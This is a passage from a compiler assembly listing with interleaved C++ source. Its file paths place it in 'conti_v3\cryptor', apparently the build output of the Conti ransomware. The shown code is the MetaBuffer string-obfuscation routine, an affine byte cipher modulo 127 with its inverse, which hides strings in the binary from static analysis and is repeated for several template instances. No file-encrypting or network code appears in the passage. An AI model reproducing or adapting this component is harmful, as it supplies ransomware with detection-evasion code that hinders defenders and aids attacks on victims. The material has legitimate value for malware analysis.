  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 1e	 sub	 eax, 30
  0002d	6b c0 c2	 imul	 eax, eax, -62		; ffffffffffffffc2H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 2b	 imul	 eax, eax, 43		; 0000002bH
  0002d	83 c0 1e	 add	 eax, 30
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0d	 cmp	 QWORD PTR i$1[rbp], 13
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv189 = 192
this$ = 240
data$ = 248
